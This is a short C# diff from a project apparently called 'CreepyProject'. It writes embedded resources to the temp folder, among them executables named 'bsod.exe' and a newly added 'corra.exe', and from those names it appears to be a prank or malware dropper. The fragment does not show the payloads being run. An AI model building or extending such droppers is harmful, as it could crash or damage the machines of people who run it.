@@ -57,8 +57,9 @@ namespace CreepyProject
             System.IO.File.WriteAllBytes(temp + "jooj.mp4", Properties.Resources.jooj);
             System.IO.File.WriteAllBytes(temp + "ABRAABRAABRAABRAABRAABRAABRAABRAABRAABRAABRA.rtf", Properties.Resources.ABRAABRAABRAABRAABRAABRAABRAABRAABRAABRAABRA);
             System.IO.File.WriteAllBytes(temp + "bsod.exe", Properties.Resources.cusole);
-            System.IO.File.WriteAllBytes(temp + "ico.ico", Properties.Resources.corra);
+            System.IO.File.WriteAllBytes(temp + "ico.ico", Properties.Resources.ico);
             System.IO.File.WriteAllBytes(temp + "txt.txt", Properties.Resources.txt);
+            System.IO.File.WriteAllBytes(temp + "corra.exe", Properties.Resources.corra);
             
             
             
